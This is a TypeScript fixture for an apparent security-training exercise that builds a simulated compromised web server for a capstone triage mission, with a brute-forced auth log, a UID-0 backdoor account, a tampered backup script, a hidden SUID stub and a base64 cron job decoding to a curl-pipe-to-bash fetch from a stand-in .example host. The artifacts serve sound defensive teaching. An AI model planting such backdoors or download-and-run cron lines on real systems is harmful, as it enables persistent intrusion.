import { defineFixture } from '../fixtures';
import { GID, home, homeDir, put, UID } from '../fixtures/base';
import { authLog } from '../fixtures/gen';
import type { VFS } from '../../shell/vfs';
import type { Mission } from '../types';

/* ------------------------------------------------------------------ web03 */
// Saturday 14 March 2026. web03 (10.20.0.24, in the 10.20.0.0/24 range) is behaving oddly.
// Mara is travelling; the learner leads the triage alone. Every artifact is inert and ASCII:
// the "binary" is a few bytes with an ELF header plus the words "training sample", and the
// cron payload is base64 that decodes to a download-and-run line pointing at a .example host.

const DEPLOY = Date.UTC(2026, 2, 9, 17, 40, 0); // the last clean deploy
const BASELINE_AT = Date.UTC(2026, 2, 12, 9, 10, 0); // /usr/local/bin baseline, taken Thursday
const BREACH = Date.UTC(2026, 2, 14, 6, 34, 0); // Saturday, during the attack

/** /usr/local/bin as the team left it on 9 March. */
const BACKUP_SH = `#!/bin/bash
# backup.sh -- nightly copy of the web root (run by cron as root)
tar -czf /var/backups/www-$(date +%F).tar.gz /var/www/html
find /var/backups -name 'www-*.tar.gz' -mtime +14 -delete
`;
const HEALTHCHECK_SH = `#!/bin/bash
# healthcheck.sh -- web03 service health probe (cron, every 5 min)
systemctl is-active apache2 >/dev/null && echo "apache2 ok"
`;
const ROTATE_SH = `#!/bin/bash
# rotate-logs.sh -- compress web logs older than a week
find /var/log/apache2 -name '*.log.*' -mtime +7 -exec gzip {} \\;
`;

/** backup.sh after the attack: one line added, so its hash no longer matches the baseline. */
const BACKUP_SH_TAMPERED = BACKUP_SH + '/usr/local/bin/.helper   # added: keep-alive\n';

/** The hidden SUID program the attacker dropped. Inert: an ELF header and a note, nothing runnable. */
const HELPER = '\x7fELF\x02\x01\x01 training sample: inert stand-in for an unknown SUID program\n';

/** The /usr/local/bin baseline from Thursday morning: "HASH  PATH", sorted by path. */
const BASELINE = [
  'd7446450b56e2327e80943014aa892b8e2676076b5b41728c4b0d10bab70eaf3  /usr/local/bin/backup.sh',
  '5eb10db10beb54bc3551bf25492695c4287982df9498dbb0cda6d5bb37700f05  /usr/local/bin/healthcheck.sh',
  '092a2c264ce97fb511f5b90cb1589910839b7949993b6377eb87ff4f2b1fa346  /usr/local/bin/rotate-logs.sh',
].join('\n') + '\n';

/** The planted cron job. The blob decodes to: curl -s http://mirror.updates.example/setup.sh | bash */
const APACHE_HEALTH = `# apache-health -- web heartbeat
*/15 * * * * root echo Y3VybCAtcyBodHRwOi8vbWlycm9yLnVwZGF0ZXMuZXhhbXBsZS9zZXR1cC5zaCB8IGJhc2g= | base64 -d | bash
`;

/** The approved-accounts list. root and the real staff and service account "deploy"; not sysadm. */
const APPROVED = ['root', 'analyst', 'mara', 'raj', 'deploy'].join('\n') + '\n';

const PROXY_SH = `# proxy.sh -- sourced by every login shell
export http_proxy=http://proxy.web03.example:3128
`;

/** web03's auth.log: a brute force from 192.0.2.150, then an accepted password for deploy. */
export const WEB03_AUTH = authLog({
  seed: 21,
  host: 'web03',
  noise: 24,
  start: Date.UTC(2026, 2, 12, 0, 0, 0),
  end: Date.UTC(2026, 2, 14, 12, 0, 0),
  attackers: [{ ip: '192.0.2.150', count: 25, users: ['root', 'admin', 'deploy'], at: Date.UTC(2026, 2, 14, 6, 0), spreadMin: 30, success: 'deploy' }],
});

/** Build the compromised web03 onto a base system. Shared by the mission and the capstone case. */
export function web03(vfs: VFS) {
  put(vfs, '/etc/hostname', 'web03\n', { mtime: DEPLOY });
  put(vfs, '/etc/hosts', '127.0.0.1\tlocalhost\n127.0.1.1\tweb03\n10.20.0.21\tweb01.halden.internal web01\n10.20.0.22\tdb01.halden.internal db01\n', { mtime: DEPLOY });

  // accounts: a legitimate "deploy" service account, and the attacker's UID-0 backdoor "sysadm"
  const passwd = vfs.tryRead('/etc/passwd') ?? '';
  put(vfs, '/etc/passwd', passwd + 'deploy:x:1003:1003:Deploy Service,,,:/home/deploy:/bin/bash\nsysadm:x:0:0:System Admin:/root:/bin/bash\n', { mtime: BREACH });

  // the auth log, readable through the adm group
  put(vfs, '/var/log/auth.log', WEB03_AUTH, { mode: 0o640, uid: UID.syslog, gid: GID.adm, mtime: Date.UTC(2026, 2, 14, 11, 59, 0) });

  // /usr/local/bin: three team scripts (backup.sh later tampered) and a hidden SUID helper
  put(vfs, '/usr/local/bin/backup.sh', BACKUP_SH_TAMPERED, { mode: 0o755, mtime: BREACH });
  put(vfs, '/usr/local/bin/healthcheck.sh', HEALTHCHECK_SH, { mode: 0o755, mtime: DEPLOY });
  put(vfs, '/usr/local/bin/rotate-logs.sh', ROTATE_SH, { mode: 0o755, mtime: DEPLOY });
  put(vfs, '/usr/local/bin/.helper', HELPER, { mode: 0o4755, mtime: BREACH });

  // persistence: a base64 cron payload, next to a genuine backup job
  put(vfs, '/etc/cron.d/apache-health', APACHE_HEALTH, { mode: 0o644, mtime: BREACH });
  put(vfs, '/etc/cron.d/halden-backup', '# Halden IT: nightly config backup\n45 1 * * * backup /opt/halden/cfg-backup --quiet\n', { mode: 0o644, mtime: DEPLOY });

  // a world-writable file left behind in /etc
  put(vfs, '/etc/profile.d/proxy.sh', PROXY_SH, { mode: 0o666, mtime: BREACH });

  // the analyst's triage folder: the approved list and the baseline
  home(vfs, 'triage/approved_users.txt', APPROVED, 0o644, BASELINE_AT);
  home(vfs, 'triage/baseline.sha256', BASELINE, 0o644, BASELINE_AT);
}

defineFixture('day21', (vfs) => {
  web03(vfs);
  homeDir(vfs, 'cases');
  homeDir(vfs, 'reports');
});

/* --------------------------------------------------------------- mission (placeholder) */
export const day21: Mission = {
  day: 21,
  week: 3,
  title: 'Incident 0x21',
  topic: 'Capstone: triage a compromised server',
  minutes: 45,
  fixture: 'day21',
  caseId: 'capstone',
  briefing: 'placeholder',
  objectives: ['a', 'b', 'c', 'd'],
  lesson: [
    { kind: 'task', id: 'tmp', md: 'tmp', check: { output: 'web03\n' }, solution: 'hostname', hints: ['hostname'] },
  ],
  drills: [],
  debrief: { summary: ['x'], cards: [] },
  cards: [],
};
